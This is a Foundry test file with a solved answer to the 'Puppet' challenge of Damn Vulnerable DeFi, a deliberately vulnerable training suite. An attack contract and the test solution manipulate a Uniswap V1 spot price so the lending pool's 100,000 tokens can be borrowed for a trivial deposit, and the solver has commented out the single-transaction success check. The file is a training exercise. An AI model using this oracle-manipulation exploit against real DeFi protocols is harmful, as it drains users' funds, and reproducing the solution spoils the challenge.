// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract AttackPuppet {
    DamnValuableToken public token;
    IUniswapV1Exchange public uniswap;
    PuppetPool public pool;
    address public recovery;

    constructor(
        address _token,
        address _uniswap,
        address _pool,
        address _recovery
    ) {
        token = DamnValuableToken(_token);
        uniswap = IUniswapV1Exchange(_uniswap);
        pool = PuppetPool(_pool);
        recovery = _recovery;
    }

    function doIt() external payable {
        // 1) Approve Uniswap to spend our DVT
        token.approve(address(uniswap), type(uint256).max);

        // 2) Swap DVT -> ETH (dumps nearly all DVT to manipulate price)
        uniswap.tokenToEthSwapInput(
            999e18, // tokens sold
            1, // min ETH out
            block.timestamp + 1
        );

        // 3) Now the price is manipulated, we can borrow all 100k DVT
        uint256 depositRequired = pool.calculateDepositRequired(100_000e18);

        // 4) Borrow 100k DVT, sending them to recovery
        pool.borrow{value: depositRequired}(100_000e18, recovery);

        // If there's leftover ETH (because we swapped 999 instead of 1000),
        // it stays in this contract or we could forward to msg.sender if we want.
    }

    // So we can receive ETH from uniswap swaps
    receive() external payable {}
}

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy an exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate = IUniswapV1Exchange(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/builds/uniswap/UniswapV1Exchange.json"
                )
            )
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(
            deployCode("builds/uniswap/UniswapV1Factory.json")
        );
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(
            uniswapV1Factory.createExchange(address(token))
        );

        // Deploy the lending pool
        lendingPool = new PuppetPool(
            address(token),
            address(uniswapV1Exchange)
        );

        // Add initial token and ETH liquidity to the pool
        token.approve(
            address(uniswapV1Exchange),
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(
                1e18,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(
            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppet() public checkSolvedByPlayer {
        uint256 d = lendingPool.calculateDepositRequired(
            PLAYER_INITIAL_TOKEN_BALANCE
        );
        console.log("KMS start dep req 2 x: ", d);

        // 1. Approve Uniswap to spend our 1000 DVT
        token.approve(address(uniswapV1Exchange), type(uint256).max);

        // 2. Swap ~999 or 1000 DVT -> ETH, drastically reducing ETH in Uniswap
        uniswapV1Exchange.tokenToEthSwapInput(
            999e18, // how much DVT we swap
            1, // minimum ETH we accept
            block.timestamp + 1
        );

        uint256 d2 = lendingPool.calculateDepositRequired(
            PLAYER_INITIAL_TOKEN_BALANCE
        );
        console.log("KMS init dep reqd should be less: ", d2);

        // 3. Now that the price is manipulated, we can borrow all 100k DVT.
        uint256 depositRequired = lendingPool.calculateDepositRequired(
            100_000e18
        );

        // depositRequired is now super low!
        console.log(
            "Deposit required after price manipulation:",
            depositRequired
        );

        // Borrow all tokens, sending them to 'recovery'
        lendingPool.borrow{value: depositRequired}(100_000e18, recovery);
    }

    // Utility function to calculate Uniswap prices
    function _calculateTokenToEthInputPrice(
        uint256 tokensSold,
        uint256 tokensInReserve,
        uint256 etherInReserve
    ) private pure returns (uint256) {
        return
            (tokensSold * 997 * etherInReserve) /
            (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player executed a single transaction
        //assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(
            token.balanceOf(address(lendingPool)),
            0,
            "Pool still has tokens"
        );
        assertGe(
            token.balanceOf(recovery),
            POOL_INITIAL_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
